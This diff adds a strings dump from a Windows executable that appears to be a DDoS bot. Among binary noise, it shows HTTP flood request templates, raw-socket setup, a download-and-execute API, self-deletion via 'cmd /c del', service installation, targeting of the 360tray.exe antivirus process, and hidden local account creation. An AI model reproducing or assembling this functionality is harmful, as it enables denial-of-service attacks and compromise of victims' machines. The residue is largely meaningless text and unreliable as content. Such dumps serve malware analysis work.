@@ -1,0 +1,397 @@
+!This program cannot be run in DOS mode.
+hU6x
+hU6x
+hU6x
+hU6x
+hU6x
+hU6x
+hURich
+.text
+`.rdata
+@.data
+.rsrc
+|$$h
+D$ f
+D$ P
+_^[3
+- R@
+L$(Q
+T$(R
+D$4G
+D$5E
+=0R@
+h S@
+|$hh
+h@V@
+58V@
+t$@u
+h$V@
+L$lQ
+5$R@
+L$Pf
+D$ E
+l$$f
+D$@P
+D$&f
+L$LQ
+hxV4
+D$Ff
+T$,f
+T$`Rj
+L$XPQ
+hM?@
+SVWP
+Ph|V@
+hdV@
+Y_^[
+=$R@
+h9h7(
+RhXV@
+9h7(Q
+QSUV
+^][Y
+t.jd
+_^[3
+_^][
+_^][
+_^][
+_^][
+_^][
+_^][
+_^][
+=$P@
+D$ISP
+D$HPS
+L$HQ
+T$DR
+D$HPj
+hTp@
+h$W@
+T$ h$W@
+D$,Ph
+L$4h$W@
+u4PP
+L$ QPPj
+D$, 
+SVWh
+hHW@
+h<W@
+hTp@
+hXq@
+hXq@
+h(W@
+D$	j
+D$ SVW
+$Qj(P
+SVWP
+h 1@
+hXq@
+hXq@
+=PP@
+hM?@
+SVWP
+SSSSS
+Y_^[
+hXq@
+=4P@
+T$$Rj
+hhX@
+hTX@
+hDX@
+L$$Q
+T$$R
+D$$Pj
+D$(P
+T$ 3
+D$hf
+D$DP
+L$hh
+D$$M
+D$%H
+D$&z
+D$LF
+D$Mi
+D$Nn
+D$Od
+D$QC
+D$RP
+D$SU
+D$UE
+D$Xo
+_^][3
+%DP@
+%HP@
+%LP@
+h>?@
+hht@
+=@x@
+=@x@
+<$Xf
+t$Wh
+% Q@
+hgG@
+50x@
+h\R@
+hPR@
+hLR@
+hDR@
+=Dx@
+hDx@
+< wL
+XPVj
+h(Y@
+=Hu@
+%(Q@
+8csm
+%,Q@
+h([@
+5<x@
+5<x@
+58x@
+5dQ@
+%<Q@
+9MZt
+hH[@
+%LQ@
+%PQ@
+hM?@
+Y__^[
+VVVVV
+5ht@
+5lt@
+%lQ@
+%pQ@
+%tQ@
+%xQ@
+%|Q@
+bad allocation
+Delete
+NoRemove
+ForceRemove
+%s %s %s
+Referer: http://%s
+Host: %s
+Connection: Close
+Cache-Control: no-cache
+GET %s HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, * / *
+Accept-Language: zh-cn
+Accept-Encoding: gzip, deflate
+User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: %s
+Connection: Keep-Alive
+GET %s HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+Accept-Language: zh-cn
+Accept-Encoding: gzip, deflate
+User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: %s
+Connection: Keep-Alive
+Send err!
+192.168.1.32
+time err!
+opt err!
+sock err!
+@InitWSAStartup Error!
+%d.%d.%d.%d
+Set IP_HDRINCL Error!
+WSASocket() failed: %d
+WSAStartup failed: %d
+ADVAPI32.dll
+OpenSCManagerA
+Open
+ > nul
+/c del 
+COMSPEC
+KERNEL32.dll
+LoadLibraryA
+%s%s
+cmd /c %s
+URLDownloadToFileA
+rolSet\Services\
+SYSTEM\CurrentCont
+AST.exe
+ast.exe
+360tray.exe
+SeDebugPrivilege
+CreateMutexA
+Description
+%c%c%c%c%c%c.exe
+%u%s
+~MHz
+HARDWARE\DESCRIPTION\System\CentralProcessor\0
+Windows NT
+Windows 8
+Windows 7
+Windows 2012
+2012
+Windows 2008
+2008
+Windows Vista
+Vista
+Windows Server 2003
+2003
+Windows XP
+Windows 2000
+2000
+ProductName
+SOFTWARE\Microsoft\Windows NT\CurrentVersion
+lstrcatA
+GetTickCount
+ExitThread
+Sleep
+OutputDebugStringA
+lstrcpyA
+MultiByteToWideChar
+CreateThread
+CloseHandle
+GetProcAddress
+LoadLibraryA
+SetThreadPriority
+GetCurrentThread
+GetCurrentProcess
+SetPriorityClass
+GetEnvironmentVariableA
+GetShortPathNameA
+GetModuleFileNameA
+ExitProcess
+ReleaseMutex
+OpenMutexA
+lstrlenA
+WinExec
+GetTempPathA
+TerminateProcess
+OpenProcess
+Process32Next
+Process32First
+CreateToolhelp32Snapshot
+WaitForSingleObject
+GetLastError
+CopyFileA
+GetSystemInfo
+GetSystemDefaultUILanguage
+KERNEL32.dll
+wsprintfA
+USER32.dll
+RegCloseKey
+RegOpenKeyExA
+RegQueryValueExA
+RegSetValueExA
+DeleteService
+CloseServiceHandle
+OpenServiceA
+SetServiceStatus
+AdjustTokenPrivileges
+LookupPrivilegeValueA
+OpenProcessToken
+RegisterServiceCtrlHandlerA
+RegOpenKeyA
+StartServiceA
+CreateServiceA
+StartServiceCtrlDispatcherA
+ADVAPI32.dll
+SHChangeNotify
+ShellExecuteExA
+SHELL32.dll
+strchr
+memset
+??3@YAXPAX@Z
+strstr
+_time64
+rand
+srand
+printf
+sprintf
+fprintf
+__iob_func
+realloc
+malloc
+__CxxFrameHandler3
+atoi
+strncpy
+strcspn
+??_U@YAPAXI@Z
+??2@YAPAXI@Z
+_CxxThrowException
+strncmp
+MSVCR80.dll
+_except_handler4_common
+_amsg_exit
+__getmainargs
+_cexit
+_exit
+_XcptFilter
+_ismbblead
+exit
+_acmdln
+_initterm
+_initterm_e
+_configthreadlocale
+__setusermatherr
+_adjust_fdiv
+__p__commode
+__p__fmode
+_encode_pointer
+__set_app_type
+_crt_debugger_hook
+?terminate@@YAXXZ
+?_type_info_dtor_internal_method@type_info@@QAEXXZ
+_unlock
+__dllonexit
+_lock
+_onexit
+_decode_pointer
+_invoke_watson
+_controlfp_s
+WSASocketA
+WSAIoctl
+WS2_32.dll
+SHDeleteKeyA
+SHLWAPI.dll
+NetLocalGroupAddMembers
+NetUserAdd
+NETAPI32.dll
+InterlockedExchange
+InterlockedCompareExchange
+GetStartupInfoA
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+IsDebuggerPresent
+QueryPerformanceCounter
+GetCurrentThreadId
+GetCurrentProcessId
+GetSystemTimeAsFileTime
+GetACP
+GetLocaleInfoA
+GetThreadLocale
+GetVersionExA
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+GyQmHmtzYTM6bXVzdGtD
+Defghi Klmnopqr Tuv
+Defghi Klmnopqr Tuvwxyab Defg
+Defghijk Mnopqrstu Wxyabcd Fghijklm Opq
+2017
+D$Y@
+.?AVtype_info@@
+eeeeeeeeeeeeeeeeeeeeeeee
+vvvttteee
+mmmeeeeeeeeeeeeeeeeee
+eeennn
+eeeeee
+eeeeee
+eeeeee
+eeeeee
+eeeeee
+eeeeee
+eeeeee
+eeeeee
+eeeeee
+eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
+HrCg@b	g(
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <dependency>
+    <dependentAssembly>
+      <assemblyIdentity type="win32" name="Microsoft.VC80.CRT" version="8.0.50608.0" processorArchitecture="x86" publicKeyToken="1fc8b3b9a1e18e3b"></assemblyIdentity>
+    </dependentAssembly>
+  </dependency>
+</assembly>PAPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADD
